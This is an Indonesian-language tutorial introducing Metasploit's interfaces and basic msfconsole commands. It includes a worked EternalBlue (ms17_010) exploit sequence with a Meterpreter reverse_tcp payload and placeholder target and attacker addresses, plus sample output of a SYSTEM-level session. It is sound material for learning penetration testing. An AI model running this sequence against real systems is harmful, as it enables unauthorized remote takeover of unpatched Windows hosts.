# Antarmuka Metasploit Framework

`Metasploit Framework` memiliki beberapa antarmuka yang bisa digunakan oleh user, mulai dari CLI (Command Line Interface) hingga GUI (Graphical User Interface). Namun, yang paling sering digunakan dan paling powerful adalah CLI melalui `msfconsole`.

Jenis-jenis Antarmuka Metasploit:

| Antarmuka | Deskripsi |
|:--:|:--:|
| `msfconsole` | Antarmuka utama berbasis CLI, digunakan untuk menjalankan `modul`, `payload`, dan `eksploitasi`. |
| `msfvenom` | CLI untuk membuat payload secara manual. |
| [Armitage](https://www.offsec.com/metasploit-unleashed/armitage/) (GUI) | Antarmuka grafis berbasis Java (sudah jarang digunakan). |
| [Metasploit Pro](https://docs.rapid7.com/metasploit/) (GUI berbayar) | Antarmuka komersial dengan fitur profesional seperti laporan dan automasi. |

## A. MSFconsole – Antarmuka Utama Metasploit

   1. Menjalankan MSFconsole:

      ```
      msfconsole
      ```

      Saat dijalankan, akan muncul banner:

      ```
             =[ metasploit v6.4.56-dev                          ]
      + -- --=[ 2505 exploits - 1291 auxiliary - 431 post       ]
      + -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
      + -- --=[ 9 evasion                                       ]

      Metasploit Documentation: https://docs.metasploit.com/
      ```

   2. Struktur Dasar Perintah di MSFconsole

      | Perintah | Fungsi |
      |:--:|:--:|
      | `search <NAMA>` | Mencari `exploit`, `payload`, `dll`. |
      | `use <MODUL>` | Memilih modul yang akan digunakan. |
      | `info` | Menampilkan detail tentang modul yang sedang digunakan. |
      | `show options` | Melihat konfigurasi parameter modul. |
      | `set <PARAMETER> <NILAI>` | Mengatur nilai parameter modul. |
      | `exploit` atau `run` | Menjalankan exploit atau modul. |

   3. Contoh Penggunaan MSFconsole:

      ```
      search windows/smb
      use exploit/windows/smb/ms17_010_eternalblue
      show options
      set RHOSTS <IP_TARGET>
      set LHOST <IP_ATTACKER>
      set PAYLOAD windows/meterpreter/reverse_tcp
      exploit
      ```

## B. Fitur Tambahan di MSFconsole

   | Fitur | Penjelasan |
   |:--:|:--:|
   | Tab Completion | Tekan `Tab` untuk melengkapi modul atau perintah otomatis. |
   | Command History | Gunakan panah atas `(↑)` untuk melihat perintah sebelumnya. |
   | Background Sessions | Gunakan background untuk menyimpan sesi eksploitasi ke background. |
   | Session Interaction | Gunakan `sessions -i <ID>` untuk membuka kembali sesi eksploitasi. |

## C. Contoh Output dari MSFconsole:

   ```
   msf6 > sessions

   Active sessions
   ===============

     Id  Name  Type                   Information               Connection
     --  ----  ----                   -----------               ----------
     1         meterpreter x86/win32  NT AUTHORITY\SYSTEM       192.168.1.10 -> 192.168.1.5
   ```

## D. Kesimpulan

   `msfconsole` adalah pusat kendali utama dalam Metasploit. Dengan memahami perintah-perintah dasar dan navigasi antarmukanya, kamu bisa mengelola modul eksploitasi, payload, dan sesi secara efisien.

   > Tips: Latih penggunaan msfconsole di lab lokal atau VM agar terbiasa sebelum digunakan dalam skenario nyata.
